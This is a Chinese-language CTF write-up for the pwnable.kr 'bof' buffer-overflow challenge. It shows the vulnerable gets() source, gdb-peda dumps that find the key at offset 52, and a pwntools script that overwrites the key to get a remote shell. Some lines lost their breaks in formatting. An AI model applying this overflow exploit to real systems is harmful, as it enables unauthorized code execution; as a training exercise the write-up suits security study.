## 题目描述

Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000

## 题解

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){    
  char overflowme[32];    
  printf("overflow me : ");    
  gets(overflowme);   
  // smash me!    
  if(key == 0xcafebabe){        
    system("/bin/sh");    
  } else{        
    printf("Nah..\n");    }
}
int main(int argc, char* argv[]){    
  func(0xdeadbeef);    
  return 0;
}
```

缓冲区溢出问题，只要把key覆盖没0xcafebabe即可。

```assembly
[----------------------------------registers-----------------------------------]EAX: 0xffffd63c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")EBX: 0xf7fc3000 --> 0x1a6da8 ECX: 0xfbad2288 EDX: 0xf7fc48a4 --> 0x0 ESI: 0x0 EDI: 0x0 EBP: 0xffffd668 ("AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")ESP: 0xffffd620 --> 0xffffd63c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")EIP: 0x8048525 (<func+40>:  cmp    DWORD PTR [ebp+0x8],0xcafebabe)EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]   0x804851a <func+29>: lea    eax,[ebp-0x2c]   0x804851d <func+32>: mov    DWORD PTR [esp],eax   0x8048520 <func+35>: call   0x80483a0 <gets@plt>=> 0x8048525 <func+40>: cmp    DWORD PTR [ebp+0x8],0xcafebabe   0x804852c <func+47>: jne    0x804853c <func+63>   0x804852e <func+49>: mov    DWORD PTR [esp],0x804861f   0x8048535 <func+56>: call   0x80483d0 <system@plt>   0x804853a <func+61>: jmp    0x8048548 <func+75>[------------------------------------stack-------------------------------------]0000| 0xffffd620 --> 0xffffd63c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")0004| 0xffffd624 --> 0x0 0008| 0xffffd628 --> 0xc2 0012| 0xffffd62c --> 0xf7eb0716 (test   eax,eax)0016| 0xffffd630 --> 0xffffffff 0020| 0xffffd634 --> 0xffffd65e ("AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")0024| 0xffffd638 --> 0xf7e28c34 --> 0x2aad 0028| 0xffffd63c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")[------------------------------------------------------------------------------]Legend: code, data, rodata, value8       if(key == 0xcafebabe){gdb-peda$ p $ebp+8$1 = (void *) 0xffffd670gdb-peda$ x/20wx $ebp+80xffffd670: 0x41474141  0x41416341  0x48414132  0x416441410xffffd680: 0x41413341  0x65414149  0x41344141  0x41414a410xffffd690: 0x35414166  0x414b4141  0x41416741  0x4c4141360xffffd6a0: 0x00000000  0xffffd724  0xffffd6c4  0x0804a0240xffffd6b0: 0x0804825c  0xf7fc3000  0x00000000  0x00000000gdb-peda$ pattern_offset 0x414741411095188801 found at offset: 52
```

找到53-56个字节即可覆盖key。

```python
from pwn import *io = remote("pwnable.kr", 9000)

payload = "a" * 52 + p32(0xcafebabe)

io.sendline(payload)io.interactive()
```